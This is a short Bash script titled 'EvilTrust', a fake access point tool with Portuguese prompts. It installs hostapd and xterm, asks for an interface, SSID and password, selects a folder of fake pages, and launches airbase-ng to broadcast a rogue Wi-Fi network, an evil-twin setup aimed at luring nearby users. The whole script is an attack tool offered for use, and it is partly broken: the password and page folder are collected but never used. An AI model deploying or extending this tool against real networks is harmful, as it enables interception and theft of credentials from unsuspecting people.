#!/bin/bash

function banner(){
    echo "EvilTrust - Fake Access Point Script"
    echo "------------------------------------"
}

function dependencies(){
    apt-get -y install xterm hostapd
}

function getInterface(){
    echo "Escolha a interface para criar a rede:"
    select interface in $(ifconfig -s | awk '{print $1}' | tail -n +2); do
        if [ -n "$interface" ]; then
            break
        else
            echo "Opção inválida. Tente novamente."
        fi
    done
}

function getCredentials(){
    read -p "Digite o nome da rede (SSID): " ssid
    read -p "Digite a senha (deixe em branco para sem senha): " password
}

function selectFakePagesFolder(){
    echo "Listando pastas no diretório atual:"
    select folder in */; do
        if [ -n "$folder" ]; then
            break
        else
            echo "Opção inválida. Tente novamente."
        fi
    done

    selected_folder=$(echo $folder | sed 's/\///')  # Remove a barra no final do nome da pasta
}

function startAttack(){
    use_channel=$(iwlist $interface channel | grep "Current Frequency" | cut -d '(' -f 2 | cut -d ')' -f 1)

    xterm -e "airbase-ng -e $ssid -c $use_channel $interface" &
    
    echo "Ponto de acesso falso iniciado. Pressione Ctrl+C para encerrar."
    read -r -d '' _ </dev/tty
}

function main(){
    clear
    banner
    dependencies
    getInterface
    getCredentials
    selectFakePagesFolder
    startAttack
}

main